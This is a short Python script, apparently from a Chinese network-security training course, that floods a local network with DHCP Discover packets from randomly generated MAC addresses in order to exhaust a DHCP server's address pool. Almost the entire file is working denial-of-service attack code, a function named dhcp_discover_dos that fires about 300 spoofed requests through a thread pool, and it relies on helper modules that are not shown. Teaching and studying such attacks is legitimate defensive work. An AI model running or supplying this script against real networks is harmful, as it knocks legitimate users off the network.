#!/usr/bin/env python3
# -*- coding=utf-8 -*-
# 本脚由亁颐堂现任明教教主编写，用于乾颐盾Python课程！
# 教主QQ:605658506
# 亁颐堂官网www.qytang.com
# 教主技术进化论拓展你的技术新边疆
# https://ke.qq.com/course/271956?tuin=24199d8a

from multiprocessing.pool import ThreadPool
from tools.random_mac import random_mac
from net_6_dhcp.dhcp_discover import dhcp_discover_sendonly

pool = ThreadPool(processes=10)


def dhcp_discover_dos(ifname):
    i = 1
    while i < 300:
        mac_add = random_mac()  # 随机产生MAC地址！
        print(mac_add)  # 打印随机产生的MAC地址！
        # 如果希望慢一点,可以设置延时参数
        pool.apply_async(dhcp_discover_sendonly, args=(ifname, mac_add, 0))
        i += 1
    pool.close()


if __name__ == '__main__':
    # 使用Linux解释器 & WIN解释器
    dhcp_discover_dos('Net1')
